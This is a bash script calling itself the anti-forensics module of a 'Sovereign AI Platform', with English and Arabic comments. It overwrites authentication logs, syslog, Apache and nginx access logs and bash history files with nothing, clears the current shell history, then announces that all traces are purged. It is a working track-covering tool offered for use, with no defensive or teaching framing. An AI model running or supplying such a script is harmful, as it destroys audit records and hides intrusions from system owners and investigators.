#!/bin/bash
# Sovereign AI Platform - Anti-Forensics Module
# (c) 2025 Al-Mu'izz Sovereign Systems
# سكريبت تنظيف الآثار الرقمية وحذف السجلات السيادية.

echo "[*] Initializing Ghost Mode (Log Cleaner)..."

# مصفوفة السجلات المستهدفة
LOG_FILES=(
    "/var/log/auth.log"
    "/var/log/syslog"
    "/var/log/bash_history"
    "/var/log/apache2/access.log"
    "/var/log/nginx/access.log"
    "/root/.bash_history"
    "/home/*/.bash_history"
)

for log in "${LOG_FILES[@]}"; do
    if [ -f "$log" ]; then
        echo "[*] Zeroing $log..."
        cat /dev/null > "$log"
    fi
done

# تنظيف سجلات الأوامر الحالية
history -c
echo "[+] All traces have been purged. System is clean."
